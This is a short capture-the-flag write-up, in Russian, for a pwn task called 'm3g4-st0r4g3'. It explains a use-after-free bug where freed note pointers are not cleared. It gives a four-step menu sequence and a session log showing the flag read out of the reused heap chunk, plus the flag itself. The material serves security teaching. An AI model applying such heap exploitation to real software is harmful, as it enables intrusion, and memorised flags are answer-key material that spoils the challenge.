# pwn | m3g4-st0r4g3

## Information
Th1s 15 my m3g4-st0r4g3. C4n y0u pwn th1s?

## Writeup
Здесь у нас уязвимость use-after-free. При удалении нашей записи мы делаем free от указателя в storage, но при этом указатель никак не затираем. Размер заметки 32 байта. При аллоцировании 25-40 байт malloc выделяет 48 байт в куче и вовзращает указатель туда. malloc отдаёт преимущество тем полям, куда уже были положены данные, а потом от них было free. Если таковых полей нет, то он выделяет новое место на куче. Следовательно если длина флага будет попадать в диапазон 25-40, то malloc потенциально может выделить место там, где до этого лежала заметка.

Алгоритм такой:
1. Делаем заметку. На куче выделяется место.
2. Удаляем заметку.
3. Аллоцируем флаг.
4. Читаем заметки.

```
=== m3g4-st0r4g3 ===
1. PUT
2. DELETE
3. INFO
4. ALLOC FLAG
5. EXIT
>1
Text: 123231dadsadas
=== m3g4-st0r4g3 ===
1. PUT
2. DELETE
3. INFO
4. ALLOC FLAG
5. EXIT
>3
=== INFO===
1. 123231dadsadas
2. (null)
3. (null)
4. (null)
5. (null)
=== m3g4-st0r4g3 ===
1. PUT
2. DELETE
3. INFO
4. ALLOC FLAG
5. EXIT
>2
Number: 1
=== m3g4-st0r4g3 ===
1. PUT
2. DELETE
3. INFO
4. ALLOC FLAG
5. EXIT
>4
=== m3g4-st0r4g3 ===
1. PUT
2. DELETE
3. INFO
4. ALLOC FLAG
5. EXIT
>3
=== INFO===
1. SgffCTF{b1m_b1m_b4m_b4m}
2. (null)
3. (null)
4. (null)
5. (null)
```

## Flag
`SgffCTF{b1m_b1m_b4m_b4m}`
